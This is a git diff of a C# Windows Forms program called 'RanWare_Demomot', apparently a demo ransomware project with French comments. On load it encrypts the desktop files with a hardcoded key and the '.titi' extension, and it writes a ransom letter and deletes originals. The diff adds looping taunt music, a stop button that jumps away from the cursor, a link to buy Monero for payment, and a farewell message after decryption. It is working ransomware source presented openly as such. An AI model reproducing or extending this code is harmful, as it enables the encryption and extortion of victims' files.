@@ -1,6 +1,8 @@
 using System.IO;
 using System.Text;
 using System.Security.Cryptography;
+using System.Diagnostics;
+using System.Media;
 
 namespace RanWare_Demomot
 {
@@ -16,16 +18,17 @@ namespace RanWare_Demomot
         List<string> filesName = new List<string>();//Liste qui va contenir les nom des fichiers
         int numberOfFiles;//Variables pour compter le nombre de fichiers encryptés
 
+        Random randomPos = new Random();//Position random du bouton "Stop the muisc"
+        SoundPlayer nyanPlayer = new SoundPlayer(@"C:\Safe_Folder\RanWare_Demomot\RanWare_Demomot\Sound\Nyan.wav");//Son nyan
+        SoundPlayer poneyPlayer = new SoundPlayer(@"C:\Safe_Folder\RanWare_Demomot\RanWare_Demomot\Sound\poney.wav");//Son poney
         const bool ENCRYPT_DESKTOP = true;//Encrypte le bureau
         const bool DECRYPT_DESKTOP = true;//Decrypte le bureau
         const bool ENCRYPT_DOCUMENTS = false;//Encrypte les documents
         const bool DECRYPT_DOCUMENTS = false;//Derypte les documents
         const bool ENCRYPT_PICTURES = false;//Encrypte les images
         const bool DECRYPT_PICTURES = false;//Decrypte les images
-        const string KEYNAME = "Password1";
-        const string ENCRYPTED_FILE_EXTENSION = ".titi";
-        //// Public key file
-        //const string PubKeyFile = @"c:\encrypt\rsaPublicKey.txt";
+        const string KEYNAME = "Password1";//Clef
+        const string ENCRYPTED_FILE_EXTENSION = ".titi";//Extention des fichiers encryptés
 
         string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);//Repertoire du bureau
         string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);//Repertoire documents
@@ -36,6 +39,7 @@ namespace RanWare_Demomot
         public Form1()
         {
             InitializeComponent();
+            nyanPlayer.PlayLooping();
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -44,17 +48,17 @@ namespace RanWare_Demomot
 
             if (ENCRYPT_DESKTOP)
             {
-                encryptFolderFiles(Desktop);
+                encryptFolderFiles(Desktop);//Encrypte le bureau
             }
 
             if (ENCRYPT_PICTURES)
             {
-                encryptFolderFiles(Pictures);
+                encryptFolderFiles(Pictures);//Encrypte les photos
             }
 
             if (ENCRYPT_DOCUMENTS)
             {
-                encryptFolderFiles(Documents);
+                encryptFolderFiles(Documents);//Encrypte les documents
             }
 
             lblNbr.Text = Convert.ToString(numberOfFiles);//Affiche le nombre de fichiers encryptés
@@ -63,7 +67,6 @@ namespace RanWare_Demomot
             {
                 ransomLetter(filesName);//Crée un fichier texte affichant tous les fichiers encryptés
             }
-            
         }
 
         /// <summary>
@@ -213,6 +216,10 @@ namespace RanWare_Demomot
                 }
                 isDecripted = true;
                 ransomLetter(filesName);
+                MessageBox.Show("Merci d'avoir fais affaire avec nous :)");
+                nyanPlayer.Stop();
+                poneyPlayer.Stop();
+                Application.Exit();
             }
             else
             {
@@ -344,6 +351,56 @@ namespace RanWare_Demomot
             {
                 fi.Delete();
             }
+        }
+
+        /// <summary>
+        /// Quand l'utilisateur clique sur le lien
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            try
+            {
+                VisitLink();
+            }
+            catch (Exception)
+            {
+                MessageBox.Show("Impossible d'ouvrir le lien");
+            }
+        }
+        /// <summary>
+        /// Methode qui ouvre le lien
+        /// </summary>
+        private void VisitLink()
+        {
+            linkLabel1.LinkVisited = true;
+            System.Diagnostics.Process.Start("https://www.binance.com/en/buy-monero");
+        }
+
+        /// <summary>
+        /// Quand l'utilisateur passe la souris sur le boutton stop celui ci change de position
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void btnStop_MouseEnter(object sender, EventArgs e)
+        {
+            int posX = randomPos.Next(1000, 1150);
+            int posY = randomPos.Next(400, 470);
+            btnStop.Location = new Point(posX, posY);
+        }
+
+        /// <summary>
+        /// Boutton pour stopper la première music (lance la deuxième)
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void btnStop_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("Ok vous n'aimez vraiment pas cette douce mélodie");
+            nyanPlayer.Stop();
+            poneyPlayer.PlayLooping();
+            btnStop.Enabled = false;
         }
     }
 }
